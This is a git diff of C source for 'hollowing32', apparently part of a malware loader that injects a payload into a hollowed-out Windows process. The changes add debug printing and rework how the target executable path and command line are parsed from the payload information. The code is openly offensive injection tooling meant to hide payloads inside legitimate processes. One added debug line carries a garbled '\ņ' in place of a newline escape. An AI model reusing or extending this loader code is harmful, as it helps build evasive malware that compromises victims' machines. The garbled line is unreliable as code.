@@ -26,6 +26,7 @@ void hollowing32(unsigned char *payload, char *payload_info) {
 	DWORD desiredPayloadImageBase;
 	LPVOID localPayloadCopy;
 
+    DEBUG_PRINT("Starting hollowing32 routine...\n");
 
     // "Old" parameters from original BFG function newRunPE32.
     // Perform some wrapping process to transform the hollowing32 parameters into original values
@@ -34,12 +35,17 @@ void hollowing32(unsigned char *payload, char *payload_info) {
     payloadData = (PVOID) payload;
 
     LPSTR targetPath;           // Path of the executable image that will be instanciated as a process to hollow into
-    targetPath = (LPSTR) strtok(payload_info, ",");    
+    char *target_path_info = strtok(payload_info, ",");
+    DEBUG_PRINT("Extracted payload_info::targetPath argument = %s\n", target_path_info);
+    targetPath = (LPSTR) target_path_info;    
     
     LPTSTR commandLine;         // The command line that will be attributed to the instanciated process
-    if(payload_info != NULL) {
-        commandLine = (LPTSTR) payload_info;
+    char *command_line_info = strtok(NULL, ",");
+    if(command_line_info != NULL) {
+        DEBUG_PRINT("Extracted payload_info::commandLine argument = %s\ņ", command_line_info);
+        commandLine = (LPTSTR) command_line_info;
     } else {
+        DEBUG_PRINT("No payload_info::commandLine argument specified.\n");
         commandLine = (LPTSTR) "";
     }
 		
